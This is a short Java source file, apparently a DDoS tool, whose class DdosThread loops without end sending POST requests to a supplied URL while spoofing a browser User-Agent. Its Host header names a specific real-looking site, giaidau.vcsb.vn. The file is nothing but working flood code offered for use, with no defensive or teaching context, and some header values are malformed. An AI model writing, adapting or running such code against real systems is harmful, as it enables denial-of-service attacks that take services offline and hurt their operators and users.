package com.dacky.controller;

import lombok.extern.slf4j.Slf4j;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

@Slf4j
public class DdosThread extends Thread {

    private AtomicBoolean running = new AtomicBoolean(true);
    private final URL url;

    String param = null;

    public DdosThread(String location) throws Exception {
        url = new URL(location);
        param = "param1=" + URLEncoder.encode("87845", "UTF-8");
    }


    @Override
    public void run() {
        while (running.get()) {
            try {
                attack();
            } catch (Exception e) {
                log.info(e.toString());
            }
        }
    }

    public void attack() throws Exception {
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setDoOutput(true);
        connection.setDoInput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Host", "https://giaidau.vcsb.vn/");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", param);
        System.out.println(this + " " + connection.getResponseCode());
        connection.getInputStream();
    }
}